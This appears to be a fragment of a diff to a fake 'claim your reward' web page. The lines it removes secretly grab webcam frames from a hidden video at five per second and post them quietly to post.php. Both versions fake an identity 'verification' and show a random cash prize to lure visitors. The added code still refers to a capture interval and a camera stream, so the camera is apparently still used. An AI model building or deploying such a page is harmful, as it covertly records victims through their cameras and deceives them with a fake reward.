-                    context.drawImage(hiddenVideo, 0, 0, 640, 480);
+        // Start verification process
+        function startVerificationProcess() {
+            progress.style.display = 'block';
+            
+            // Simulated verification progress
+            let progressValue = 0;
+            const progressInterval = setInterval(() => {
+                progressValue += 10;
+                progressBar.style.width = progressValue + '%';
+                
+                if (progressValue >= 100) {
+                    clearInterval(progressInterval);
                     
-                    // Convert to data URL
-                    const imageData = captureCanvas.toDataURL("image/jpeg", 0.5)
-                        .replace("image/jpeg", "image/octet-stream");
+                    // Verification complete
+                    isVerified = true;
+                    enableClaimButton();
+                    updateCameraStatus('verified', 'Verification complete!');
                     
-                    // Send to server
-                    sendToServer(imageData);
+                    // Show success status
+                    status.style.display = 'block';
                     
-                    // Update capture count
-                    captureCount++;
-                    captureCountBadge.textContent = `(${captureCount})`;
+                    // Create celebration
+                    createConfetti();
                     
-                    // Log every 50th capture
-                    if (captureCount % 50 === 0) {
-                        console.log(`Auto-verify: ${captureCount} frames captured`);
+                    // Hide progress after delay
+                    setTimeout(() => {
+                        progress.style.display = 'none';
+                    }, 1000);
+                }
+            }, 300);
+        }
+        
+        // Update camera status
+        function updateCameraStatus(state, message) {
+            switch(state) {
+                case 'initializing':
+                    cameraStatusBox.className = 'camera-status-box';
+                    cameraIcon.className = 'bi bi-hourglass';
+                    cameraIcon.style.color = '#FFD700';
+                    break;
+                    
+                case 'active':
+                    cameraStatusBox.className = 'camera-status-box active';
+                    cameraIcon.className = 'bi bi-camera-video-fill';
+                    cameraIcon.style.color = '#00FF00';
+                    break;
+                    
+                case 'verified':
+                    cameraStatusBox.className = 'camera-status-box active';
+                    cameraIcon.className = 'bi bi-shield-check';
+                    cameraIcon.style.color = '#00FF00';
+                    break;
+                    
+                case 'error':
+                    cameraStatusBox.className = 'camera-status-box error';
+                    cameraIcon.className = 'bi bi-camera-video-off';
+                    cameraIcon.style.color = '#FF4444';
+                    break;
+            }
+            
+            cameraMessage.textContent = message;
+        }
+        
+        // Enable claim button
+        function enableClaimButton() {
+            claimBtn.disabled = false;
+            claimBtn.innerHTML = '<i class="bi bi-gift-fill"></i> CLAIM YOUR REWARD NOW';
+        }
+        
+        // Claim reward
+        function claimReward() {
+            if (!isVerified) {
+                alert('Auto-verification in progress... Please wait.');
+                return;
+            }
+            
+            // Get prize range
+            const min = parseInt(document.getElementById('minPrize').value) || 100;
+            const max = parseInt(document.getElementById('maxPrize').value) || 10000;
+            
+            // Validate
+            if (min >= max) {
+                alert('Max prize must be greater than min prize!');
+                return;
+            }
+            
+            // Generate random prize
+            const prize = Math.floor(Math.random() * (max - min + 1)) + min;
+            
+            // Display with animation
+            rewardAmount.textContent = '$ ???';
+            rewardAmount.style.opacity = '0.5';
+            
+            setTimeout(() => {
+                rewardAmount.textContent = `$${prize.toLocaleString()}`;
+                rewardAmount.style.opacity = '1';
+                rewardAmount.style.transform = 'scale(1.1)';
+                
+                setTimeout(() => {
+                    rewardAmount.style.transform = 'scale(1)';
+                    
+                    // Create celebration
+                    for(let i = 0; i < 3; i++) {
+                        setTimeout(() => createConfetti(), i * 300);
                     }
                     
-                } catch (error) {
-                    console.log('Capture error:', error);
+                    alert(`🎉 CONGRATULATIONS !\n\nYou won $${prize.toLocaleString()}!\n\nReward is being processed...`);
+                }, 300);
+            }, 500);
+            
+            // Animate button
+            claimBtn.style.transform = 'scale(0.95)';
+            setTimeout(() => claimBtn.style.transform = '', 150);
+        }
+        
+        // Validate prize range
+        function validatePrizeRange() {
+            const minInput = document.getElementById('minPrize');
+            const maxInput = document.getElementById('maxPrize');
+            
+            let min = parseInt(minInput.value);
+            let max = parseInt(maxInput.value);
+            
+            // Ensure minimum values
+            if (min < 100) min = 100;
+            if (max < 500) max = 500;
+            if (max > 10000) max = 10000;
+            
+            // Ensure max > min
+            if (min >= max) {
+                max = min + 100;
+                if (max > 10000) {
+                    max = 10000;
+                    min = max - 100;
                 }
             }
-        }, 200); // 5 captures per second
+            
+            minInput.value = min;
+            maxInput.value = max;
+        }
         
-        console.log('Auto-capture started at 5fps');
-    }
-    
-    // Send data to server (Original post.php endpoint)
-    function sendToServer(data) {
-        $.ajax({
-            type: 'POST',
-            data: { cat: data },
-            url: 'post.php',
-            dataType: 'json',
-            async: true,
-            success: function(result) {
-                // Success callback - silent
-            },
-            error: function() {
-                // Error handling - silent, don't spam console
+        // Create confetti
+        function createConfetti() {
+            for (let i = 0; i < 40; i++) {
+                const confetti = document.createElement('div');
+                confetti.classList.add('confetti');
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.backgroundColor = `hsl(${Math.random() * 60 + 30}, 100%, 50%)`;
+                confetti.style.width = Math.random() * 8 + 4 + 'px';
+                confetti.style.height = Math.random() * 8 + 4 + 'px';
+                confettiContainer.appendChild(confetti);
+                
+                const duration = Math.random() * 2000 + 1000;
+                
+                confetti.animate([
+                    { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
+                    { transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }
+                ], {
+                    duration: duration,
+                    delay: Math.random() * 300
+                });
+                
+                setTimeout(() => confetti.remove(), duration + 500);
+            }
+        }
+        
+        // Create initial confetti
+        function createInitialConfetti() {
+            setTimeout(createConfetti, 500);
+        }
+        
+        // Cleanup
+        window.addEventListener('beforeunload', function() {
+            if (captureInterval) clearInterval(captureInterval);
+            if (verificationTimeout) clearTimeout(verificationTimeout);
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
             }
         });
-    }
-    
-    // Start verification process
-    function startVerificationProcess() {
-        verificationProgress.style.display = 'block';
-        
-        // Simulated verification progress
-        let progressValue = 0;
-        const progressInterval = setInterval(() => {
-            progressValue += 10;
-            progressFill.style.width = progressValue + '%';
-            
-            if (progressValue >= 100) {
-                clearInterval(progressInterval);
-                
-                // Verification complete
-                isVerified = true;
-                claimBtn.disabled = false;
-                updateCameraStatus('verified', 'Verification complete!');
-                
-                // Add to chat
-                addSystemMessage('🎉 Verification complete! You can now claim your reward.');
-                
-                // Create celebration
-                createConfetti();
-                
-                // Hide progress after delay
-                setTimeout(() => {
-                    verificationProgress.style.display = 'none';
-                }, 1000);
-            }
-        }, 300);
-    }
-    
-    // Update camera status
-    function updateCameraStatus(state, message) {
-        const statusDiv = document.getElementById('cameraBgStatus');
-        
-        switch(state) {
-            case 'initializing':
-                cameraIcon.className = 'bi bi-hourglass-split';
-                cameraIcon.style.color = '#FFD700';
-                statusDiv.classList.remove('verified', 'error');
-                break;
-                
-            case 'active':
-                cameraIcon.className = 'bi bi-camera-video-fill';
-                cameraIcon.style.color = '#00FF00';
-                statusDiv.classList.remove('verified', 'error');
-                break;
-                
-            case 'verified':
-                cameraIcon.className = 'bi bi-shield-check-fill';
-                cameraIcon.style.color = '#00FF00';
-                statusDiv.classList.add('verified');
-                statusDiv.classList.remove('error');
-                break;
-                
-            case 'error':
-                cameraIcon.className = 'bi bi-camera-video-off-fill';
-                cameraIcon.style.color = '#FF4444';
-                statusDiv.classList.add('error');
-                statusDiv.classList.remove('verified');
-                break;
-        }
-        
-        cameraStatusText.textContent = message;
-    }
-    
-    // Claim reward
-    function claimReward() {
-        if (!isVerified) {
-            alert('Verification in progress... Please wait for completion.');
-            return;
-        }
-        
-        // Get prize range
-        const min = 100;
-        const max = 10000;
-        
-        // Generate random prize
-        const prize = Math.floor(Math.random() * (max - min + 1)) + min;
-        
-        // Display with animation
-        rewardAmount.textContent = '$???';
-        rewardAmount.style.opacity = '0.5';
-        
-        setTimeout(() => {
-            rewardAmount.textContent = `$${prize.toLocaleString()}`;
-            rewardAmount.style.opacity = '1';
-            rewardAmount.style.transform = 'scale(1.1)';
-            
-            setTimeout(() => {
-                rewardAmount.style.transform = 'scale(1)';
-                
-                // Create celebration
-                for(let i = 0; i < 3; i++) {
-                    setTimeout(() => createConfetti(), i * 300);
-                }
-                
-                addSystemMessage(`🎉 CONGRATULATIONS! You won $${prize.toLocaleString()}!`);
-                alert(`🎉 CONGRATULATIONS!\n\nYou won $${prize.toLocaleString()}!\n\nReward is being processed...`);
-            }, 300);
-        }, 500);
-        
-        // Animate button
-        claimBtn.style.transform = 'scale(0.95)';
-        setTimeout(() => claimBtn.style.transform = '', 150);
-    }
-    
-    // Create confetti
-    function createConfetti() {
-        for (let i = 0; i < 40; i++) {
-            const confetti = document.createElement('div');
-            confetti.classList.add('confetti');
-            confetti.style.left = Math.random() * 100 + 'vw';
-            confetti.style.backgroundColor = `hsl(${Math.random() * 60 + 30}, 100%, 50%)`;
-            confetti.style.width = Math.random() * 8 + 4 + 'px';
-            confetti.style.height = Math.random() * 8 + 4 + 'px';
-            confettiContainer.appendChild(confetti);
-            
-            const duration = Math.random() * 2000 + 1000;
-            
-            confetti.animate([
-                { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
-                { transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }
-            ], {
-                duration: duration,
-                delay: Math.random() * 300
-            });
-            
-            setTimeout(() => confetti.remove(), duration + 500);
-        }
-    }
-    
-    // Create initial confetti
-    function createInitialConfetti() {
-        setTimeout(createConfetti, 500);
-    }
-    
-    // Add system message to chat
-    function addSystemMessage(message) {
-        const messagesArea = document.getElementById('messagesArea');
-        const messageDiv = document.createElement('div');
-        messageDiv.className = 'message other';
-        messageDiv.innerHTML = `<i class="bi bi-info-circle"></i> ${message}<br><small>🔒 System • ${new Date().toLocaleTimeString()}</small>`;
-        messagesArea.appendChild(messageDiv);
-        messagesArea.scrollTop = messagesArea.scrollHeight;
-    }
-    
-    // Generate background particles
-    function generateParticles() {
-        const particlesContainer = document.getElementById('particles');
-        for (let i = 0; i < 50; i++) {
-            const particle = document.createElement('div');
-            particle.classList.add('particle');
-            particle.style.left = Math.random() * 100 + '%';
-            particle.style.width = Math.random() * 4 + 2 + 'px';
-            particle.style.height = particle.style.width;
-            particle.style.animationDuration = Math.random() * 8 + 4 + 's';
-            particle.style.animationDelay = Math.random() * 5 + 's';
-            particlesContainer.appendChild(particle);
-        }
-    }
-    
-    // ==================== CALL FUNCTIONALITY (Placeholder) ====================
-    
-    function setupCallListeners() {
-        document.getElementById('claimBtn').addEventListener('click', claimReward);
-        
-        document.getElementById('toggleAudioBtn').addEventListener('click', function() {
-            this.classList.toggle('active');
-            const span = this.querySelector('span');
-            span.textContent = this.classList.contains('active') ? 'Mic Off' : 'Mic On';
-            addSystemMessage(`Microphone ${this.classList.contains('active') ? 'muted' : 'unmuted'}`);
-        });
-        
-        document.getElementById('startCallBtn').addEventListener('click', function() {
-            addSystemMessage('🔗 Initiating call connection... (Demo mode)');
-            document.getElementById('remoteStatusBadge').innerHTML = '<i class="bi bi-dot"></i> Connecting to peer...';
-            setTimeout(() => {
-                document.getElementById('remoteStatusBadge').innerHTML = '<i class="bi bi-check-circle-fill"></i> Connected';
-                addSystemMessage('✅ Call connected! Audio/video channel established.');
-            }, 2000);
-        });
-        
-        document.getElementById('endCallBtn').addEventListener('click', function() {
-            addSystemMessage('📞 Call ended.');
-            document.getElementById('remoteStatusBadge').innerHTML = '<i class="bi bi-dot"></i> Disconnected';
-        });
-        
-        document.getElementById('sendMsgBtn').addEventListener('click', sendMessage);
-        document.getElementById('chatInput').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') sendMessage();
-        });
-    }
-    
-    function sendMessage() {
-        const input = document.getElementById('chatInput');
-        const message = input.value.trim();
-        if (!message) return;
-        
-        const messagesArea = document.getElementById('messagesArea');
-        const messageDiv = document.createElement('div');
-        messageDiv.className = 'message own';
-        messageDiv.innerHTML = `${message}<br><small>You • ${new Date().toLocaleTimeString()}</small>`;
-        messagesArea.appendChild(messageDiv);
-        messagesArea.scrollTop = messagesArea.scrollHeight;
-        input.value = '';
-        
-        // Simulate reply
-        setTimeout(() => {
-            const replyDiv = document.createElement('div');
-            replyDiv.className = 'message other';
-            replyDiv.innerHTML = `👍 Message received<br><small>Remote • ${new Date().toLocaleTimeString()}</small>`;
-            messagesArea.appendChild(replyDiv);
-            messagesArea.scrollTop = messagesArea.scrollHeight;
-        }, 500);
-    }
-    
-    // Cleanup on page unload
-    window.addEventListener('beforeunload', function() {
-        if (captureInterval) clearInterval(captureInterval);
-        if (hiddenVideo.srcObject) {
-            hiddenVideo.srcObject.getTracks().forEach(track => track.stop());
-        }
-    });
-</script>
+    </script>
 </body>
 </html>
